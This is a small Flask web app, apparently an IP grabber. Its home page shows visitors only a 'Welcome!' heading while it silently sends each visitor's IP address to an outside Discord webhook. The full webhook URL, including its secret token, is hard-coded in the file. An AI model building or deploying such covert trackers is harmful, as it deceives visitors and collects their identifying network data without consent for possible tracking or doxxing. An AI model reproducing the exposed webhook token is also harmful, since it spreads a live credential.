from flask import Flask, request
import requests
import os  # MOVE this import here, not inside the main guard

app = Flask(__name__)

WEBHOOK_URL = 'https://discord.com/api/webhooks/1382611407199014912/A6GHc65WzrRbciHynuMssat9MI0eYlONJTq3sinrx5TtmjGpCFtc7qCwlfirzh_qxfPd'

@app.route('/')
def home():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    send_to_discord(ip)
    return "<h1>Welcome!</h1>"

def send_to_discord(ip):
    data = {
        "content": f"New visitor IP: {ip}"
    }
    try:
        r = requests.post(WEBHOOK_URL, json=data)
        print(f"Discord webhook status: {r.status_code}")
    except Exception as e:
        print(f"Error sending to Discord webhook: {e}")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))  # NOW this should work
    print(f"Starting app on port {port}")
    app.run(host='0.0.0.0', port=port)
